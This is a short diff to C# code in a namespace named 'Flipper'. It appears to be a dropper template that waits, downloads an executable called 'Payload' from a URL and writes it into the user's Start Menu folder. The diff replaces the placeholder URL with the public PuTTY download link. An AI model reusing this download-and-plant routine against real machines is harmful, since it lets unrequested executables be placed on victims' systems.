@@ -12,9 +12,9 @@ namespace Flipper
         public void Run()
         {
             Thread.Sleep(2500);
-            byte[] Payload = DownloadPayload("http://YOUR_FILE_URL.exe");
+            byte[] Payload = DownloadPayload("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe");
 			
-            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\YOUR_FILE_NAME.exe", Payload))
+            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\putty.exe", Payload))
             {
             }
         }
